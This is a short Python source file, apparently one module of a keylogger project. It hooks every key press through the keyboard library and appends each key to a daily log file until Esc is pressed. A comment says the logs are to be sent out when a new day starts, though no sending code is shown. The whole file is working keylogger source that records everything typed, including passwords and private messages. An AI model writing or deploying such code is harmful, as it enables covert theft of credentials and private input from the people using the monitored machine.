import keyboard
from functools import partial
from src.static.auxiliaries import get_actual_date

def __log_key(event, filename):
    keyname = event.name

    with open(filename, "a") as keylog_file:
        if keyname != 'enter':
            keylog_file.write(keyname)
        else:
            keylog_file.write('\n')

# Start listening for key events
def listen_keyboard():
    # We will create files for each day,
    # resume the logging within the same file,
    # and sending all the data when a new day is detected
    filename = f"keylog_{get_actual_date()}.txt"
    
    log_key_callback = partial(__log_key, filename=filename)
    keyboard.on_press(log_key_callback)
    print("Keylogger is running...")
    
    # Keep the script running until 'Esc' is pressed
    keyboard.wait('esc')

    return filename